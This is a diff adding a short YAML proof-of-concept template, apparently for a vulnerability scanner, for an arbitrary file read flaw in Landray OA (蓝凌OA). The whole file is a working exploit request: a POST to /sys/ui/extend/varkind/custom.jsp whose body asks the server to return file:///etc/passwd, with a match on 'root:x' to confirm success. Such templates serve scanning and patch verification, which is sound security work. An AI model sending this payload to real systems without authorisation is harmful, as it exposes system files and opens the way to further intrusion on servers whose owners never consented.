@@ -1,0 +1,13 @@
+name: poc-yaml-蓝凌OA-Diretory
+description: "任意文件读取"
+method: POST
+headers:
+  Content-Type: "application/x-www-form-urlencoded"
+body: >
+  var={"body":{"file":"file:///etc/passwd"}}
+path:
+  - /sys/ui/extend/varkind/custom.jsp
+expression:
+  status: 200
+  body_all:
+    - "root:x"
